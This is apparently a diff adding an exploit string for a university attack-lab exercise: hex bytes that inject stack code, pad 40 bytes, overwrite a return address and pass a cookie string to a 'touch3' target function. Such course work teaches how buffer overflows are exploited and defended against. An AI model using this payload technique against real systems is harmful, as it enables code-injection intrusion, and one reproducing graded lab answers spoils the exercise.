@@ -1,0 +1,8 @@
+48 c7 c7 40 64 62 55 c3 /* rsp+0x38 address where the cookie is present */
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 /* get to 40 bytes of padding */
+08 64 62 55 00 00 00 00 /* address of reg. %rsp */
+43 14 40 00 00 00 00 00 /* address of touch3 */
+36 33 63 38 30 66 39 38 /* cookie string */
